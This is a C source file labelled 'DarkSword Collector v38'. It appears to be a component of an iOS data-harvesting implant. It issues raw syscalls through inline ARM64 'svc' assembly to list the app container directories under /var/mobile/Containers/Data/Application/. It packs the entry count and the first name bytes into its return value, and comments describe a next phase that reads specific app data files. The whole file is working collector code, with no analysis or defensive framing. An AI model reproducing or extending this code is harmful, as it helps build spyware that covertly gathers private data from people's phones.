/**
 * DarkSword Collector v38 - Directory enumeration via getdirentries
 * Lists /var/mobile/Containers/Data/Application/ to find app container UUIDs
 * Returns first byte of each UUID directory name
 */

static long _svc1(long n, long a) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory"); return x0;
}
static long _svc2(long n, long a, long b) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory"); return x0;
}
static long _svc3(long n, long a, long b, long c) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory"); return x0;
}
static long _svc4(long n, long a, long b, long c, long d) {
    register long x16 __asm__("x16") = n; register long x0 __asm__("x0") = a; register long x1 __asm__("x1") = b; register long x2 __asm__("x2") = c; register long x3 __asm__("x3") = d;
    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2), "r"(x3) : "memory"); return x0;
}

#define SYS_open 5
#define SYS_read 3
#define SYS_close 6
#define SYS_lseek 199
#define SYS_getdirentries 196
#define SEEK_SET 0
#define O_RDONLY 0

/* Phase 1: Enumerate container dir entries
 * Phase 2: Read specific app data files
 * g_ctx: bits 0-15 = chunk/entry index, bits 16-23 = phase (0=enum, 1+=files)
 */
static volatile int g_ctx = 0;

/* Buffer for directory entries - in __TEXT,__const to avoid __DATA issues */
static volatile unsigned char dirbuf[4096] __attribute__((section("__TEXT,__const"))) = {0};

int ds_start(void) {
    int ctx;
    __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
    int phase = (ctx >> 16) & 0xFF;
    int idx = ctx & 0xFFFF;

    if (phase == 0) {
        /* Phase 0: Enumerate app container directory */
        if (idx >= 200) {
            /* Move to phase 1 */
            int nc = (1 << 16);
            __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
            return 0xFF000000 | 0; /* phase boundary */
        }

        int fd = (int)_svc2(SYS_open, (long)"/var/mobile/Containers/Data/Application/", O_RDONLY);
        if (fd < 0) return 0xFE000000;

        long base = 0;
        int nread = (int)_svc4(SYS_getdirentries, fd, (long)(dirbuf + 16), 4000, (long)&dirbuf);
        _svc1(SYS_close, fd);

        if (nread < 1) {
            int nc = (1 << 16);
            __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
            return 0xEE000000;
        }

        /* Walk entries and return count + first entry info */
        int pos = 0;
        int count = 0;
        int first_namlen = 0;
        unsigned char first_byte = 0;

        while (pos < nread) {
            unsigned short *entry = (unsigned short *)(dirbuf + 16 + pos);
            unsigned short reclen = entry[4];  /* d_reclen at offset 8 */
            unsigned short namlen = entry[5];  /* d_namlen at offset 10 */
            unsigned char dtype = *((unsigned char *)(dirbuf + 16 + pos + 11)); /* d_type at offset 11 */

            if (reclen == 0) break;
            count++;

            if (count == 1) {
                first_namlen = namlen;
                first_byte = *((unsigned char *)(dirbuf + 16 + pos + 12)); /* d_name[0] */
            }

            pos += reclen;
        }

        /* Return: count in bits 0-7, first_entry_namlen in bits 8-15, first_byte in bits 16-23 */
        int nc = (ctx + 1); /* advance chunk */
        __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));

        return count | (first_namlen << 8) | ((int)first_byte << 16);
    }

    /* Phase 1+: done for now */
    __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
    return 0xFFFFFFFF;
}
